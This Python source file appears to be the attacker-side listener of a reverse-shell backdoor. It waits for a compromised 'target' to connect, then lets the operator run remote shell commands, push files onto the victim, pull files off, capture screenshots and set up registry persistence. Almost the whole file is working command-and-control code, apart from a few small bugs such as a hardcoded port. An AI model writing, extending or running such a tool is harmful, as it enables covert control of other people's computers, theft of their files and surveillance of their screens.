import json
import os
import socket

import termcolor


def hunter_server():
    """
    Initiates the server for communication with the target machine.

    Returns:
        None
    """

    def reliable_recv():
        """
        Receives data reliably over the network.

        Returns:
            str: Received data.
        """
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def reliable_send(data):
        """
        Sends data reliably over the network.

        Args:
            data: Data to be sent.

        Returns:
            None
        """
        jsondata = json.dumps(data)
        target.send(jsondata.encode())

    def upload_file(file_name):
        """
        Uploads a file to the target machine.

        Args:
            file_name (str): Name of the file to upload.

        Returns:
            None
        """
        f = open(file_name, "rb")
        target.send(f.read())

    def download_file(file_name):
        """
        Downloads a file from the target machine.

        Args:
            file_name (str): Name of the file to download.

        Returns:
            None
        """
        f = open(file_name, "wb")
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
        target.settimeout(None)
        f.close()

    def target_communication():
        """
        Handles communication with the target machine.

        Returns:
            None
        """
        count = 0
        while True:
            command = input("* Shell~%s: " % str(ip))
            reliable_send(command)
            if command == "quit":
                break
            elif command == "help":
                print(
                    termcolor.colored(
                        """\n
                quit                                --  Quit Session with the Target
                clear                               --  Clear your screen
                cd <directory_name>                 --  Changes Directory on Target System
                inject *file_name*                  --  Upload File To The Target System
                screenshot                          --  Take a Screenshot of the Target System
                download *file_name*                --  Download Files from the Target
                persistence *RegName* *file_name*   --  Create Persistence in Registry\n""",
                        "red",
                        attrs=["bold"],
                    )
                )
            elif command == "clear":
                os.system("clear")
            elif command[:3] == "cd ":
                pass
            elif command[:6] == "inject":
                upload_file(command[7:])
            elif command[:8] == "download":
                download_file(command[:9])
            elif command[:10] == "screenshot":
                f = open("screenshot%d" % (count), "wb")
                target.settimeout(3)
                chunk = target.recv(1024)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = target.recv(1024)
                    except socket.timeout as e:
                        break
                target.settimeout(None)
                f.close()
                count += 1
            else:
                result = reliable_recv()
                print(result)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    your_ip = input("What's your ip: ")
    your_port = int(input("Port to communicate on: "))
    sock.bind((your_ip, 5555))
    print(termcolor.colored("\n[+] Listening for incoming connections", "green"))
    sock.listen(5)
    target, ip = sock.accept()
    print(termcolor.colored("\n[+] Target Connected From: " + str(ip), "green"))
    target_communication()
